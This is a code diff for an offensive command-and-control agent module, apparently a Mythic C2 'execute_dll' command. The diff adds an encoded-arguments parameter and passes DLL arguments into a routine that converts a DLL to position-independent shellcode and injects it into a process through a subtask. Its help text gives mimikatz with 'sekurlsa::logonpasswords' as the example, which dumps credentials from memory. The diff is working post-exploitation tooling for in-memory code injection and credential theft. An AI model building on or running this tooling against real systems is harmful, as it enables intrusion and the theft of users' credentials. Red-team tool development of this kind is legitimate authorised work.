@@ -70,9 +70,22 @@ class ExecuteDllArguments(TaskArguments):
                     ),
                 ],
             ),
-            
-            
-            # TODO - Add arguments for x64/x86, Method name (optional), Class name (optional)
+            CommandParameter(
+                name="dll_arguments_encoded",
+                cli_name="Encoded Arguments",
+                display_name="Encoded Arguments",
+                type=ParameterType.String,
+                description="Encoded arguments to pass to the DLL.",
+                default_value=None,
+                parameter_group_info=[
+                    ParameterGroupInfo(
+                        required=False, group_name="Default", ui_position=3,
+                    ),
+                    ParameterGroupInfo(
+                        required=False, group_name="New DLL", ui_position=3
+                    ),
+                ],
+            ),
         ]
     
     async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
@@ -99,12 +112,6 @@ class ExecuteDllArguments(TaskArguments):
             response.Error = f"Failed to get files: {file_resp.Error}"
             return response
 
-
-    async def parse_arguments(self):
-        if len(self.command_line) == 0:
-            raise ValueError("Must supply arguments")
-        raise ValueError("Must supply named arguments or use the modal")
-
     async def parse_arguments(self):
         if len(self.command_line) == 0:
             raise Exception(
@@ -116,42 +123,28 @@ class ExecuteDllArguments(TaskArguments):
             self.load_args_from_json_string(self.command_line)
         else:
             parts = self.command_line.split(" ", maxsplit=1)
-            self.add_arg("assembly_name", parts[0])
-            self.add_arg("assembly_arguments", "")
+            self.add_arg("dll_name", parts[0])
+            self.add_arg("dll_arguments", "")
             if len(parts) == 2:
-                self.add_arg("assembly_arguments", parts[1])
+                self.add_arg("dll_arguments", parts[1])
 
-def print_attributes(obj):
-    for attr in dir(obj):
-        if not attr.startswith("__"):  # Ignore built-in dunder methods
-            try:
-                logging.info(f"{attr}: {getattr(obj, attr)}")
-            except Exception as e:
-                logging.info(f"{attr}: [Error retrieving attribute] {e}")
-
-
-    async def parse_arguments(self):
-        if len(self.command_line) == 0:
-            raise Exception("No arguments given.")
-        if self.command_line[0] != "{":
-            raise Exception("Require JSON blob, but got raw command line.")
-        self.load_args_from_json_string(self.command_line)
-        pass
         
 class ExecuteDllCommand(CoffCommandBase):
     cmd = "execute_dll"
     needs_admin = False
-    help_cmd = "execute_dll -File [mimikatz.x64.dll]"
-    description = "Execute a Dynamic Link Library as PIC. (e.g., execute_dll -File mimikatz.x64.dll"
+    help_cmd = "execute_dll -File [mimikatz.x64.dll] -Arguments [args]"
+    description = "Execute a Dynamic Link Library as PIC. (e.g., execute_dll -File mimikatz.x64.dll -Arguments \"sekurlsa::logonpasswords\")"
     version = 1
     author = "@c0rnbread"
+    script_only = True
     attackmapping = []
     argument_class = ExecuteDllArguments
     attributes = CommandAttributes(
         builtin=False,
+        alias=True,
         dependencies=["inline_execute", "inject_shellcode"],        # Required for ProcessInjectKit
         supported_os=[ SupportedOS.Windows ],
-        suggested_command=False
+        suggested_command=True
     )
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
@@ -180,13 +173,7 @@ class ExecuteDllCommand(CoffCommandBase):
                         raise Exception("Failed to find that file")
                 else:
                     raise Exception("Error from Mythic trying to get file: " + str(file_resp.Error))
-                
-                # Set display parameters
-                response.DisplayParams = "-File {} -Arguments {}".format(
-                    file_resp.Files[0].Filename,
-                    taskData.args.get_arg("dll_arguments")
-                )
-                
+                                
                 taskData.args.add_arg("dll_name", file_resp.Files[0].Filename)
                 taskData.args.remove_arg("dll_file")
             
@@ -203,30 +190,37 @@ class ExecuteDllCommand(CoffCommandBase):
                         logging.info(f"Found existing DLL with File ID : {file_resp.Files[0].AgentFileId}")
 
                         taskData.args.remove_arg("dll_name")    # Don't need this anymore
-                        
-                        # Set display parameters
-                        response.DisplayParams = "-File {} -Arguments {}".format(
-                            file_resp.Files[0].Filename,
-                            taskData.args.get_arg("dll_arguments")
-                        )
 
                     elif len(file_resp.Files) == 0:
                         raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
                 else:
                     raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))
 
-            
+            # Set display parameters
+            response.DisplayParams = "{} {}".format(
+                file_resp.Files[0].Filename,
+                taskData.args.get_arg("dll_arguments")
+            )
+
             #
             # Convert DLL -> PIC with Crystal Palace linker
             #
-            
-            # TODO: Do something with DLL arguments (dll_arguments)
-            
-            shellcode_file_contents = await convert_postex_dll_to_pic(file_resp.Files[0].AgentFileId)
+            agent_uuid = taskData.Callback.AgentCallbackID if taskData.Callback else None
+            dll_file_uuid = file_resp.Files[0].AgentFileId
+            dll_arguments_encoded = taskData.args.get_arg("dll_arguments_encoded")
+            dll_arguments = taskData.args.get_arg("dll_arguments")
+            logging.info(f"Agent UUID: {agent_uuid}")
+
+            shellcode_file_contents = await convert_postex_dll_to_pic(
+                dll_file_uuid,
+                dll_arguments,
+                dll_arguments_encoded,
+                agent_uuid=agent_uuid
+            )
 
             logging.info(f"Converted DLL to PIC. Size: {len(shellcode_file_contents)} bytes")
 
-            # Create DLL shellcode stub in Mythic
+            # Upload PIC file to Mythic
             shellcode_file_resp = await SendMythicRPCFileCreate(
                 MythicRPCFileCreateMessage(TaskID=taskData.Task.ID, FileContents=shellcode_file_contents, DeleteAfterFetch=True)
             )
@@ -236,7 +230,7 @@ class ExecuteDllCommand(CoffCommandBase):
             else:
                 raise Exception("Failed to register DLL PIC stub: " + shellcode_file_resp.Error)
             
-            # Send subtask to inject shellcode
+            # Send subtask to inject PIC
             subtask = await SendMythicRPCTaskCreateSubtask(
                 MythicRPCTaskCreateSubtaskMessage(
                     taskData.Task.ID,
